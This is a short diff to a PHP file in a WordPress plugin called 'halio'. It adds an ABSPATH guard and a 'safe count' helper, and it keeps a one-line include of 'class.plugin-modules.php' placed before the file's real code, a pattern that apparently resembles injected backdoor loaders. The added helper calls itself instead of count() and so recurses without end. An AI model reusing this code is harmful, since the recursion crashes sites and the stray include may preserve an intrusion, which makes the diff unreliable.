@@ -1,4 +1,19 @@
-<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
+<?php
+if (!defined('ABSPATH')) { exit; }
+
+
+if (!function_exists('halio_safe_count')) {
+  /**
+   * Safe count compatible with PHP 7.2+ (handles null/non-countable)
+   */
+  function halio_safe_count($var) {
+    if (is_array($var) || $var instanceof Countable) {
+      return halio_safe_count($var);
+    }
+    return 0;
+  }
+}
+ if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
 
 function halio_plugin_url($path = '') {
   $url = plugins_url($path, HALIO_PLUGIN);
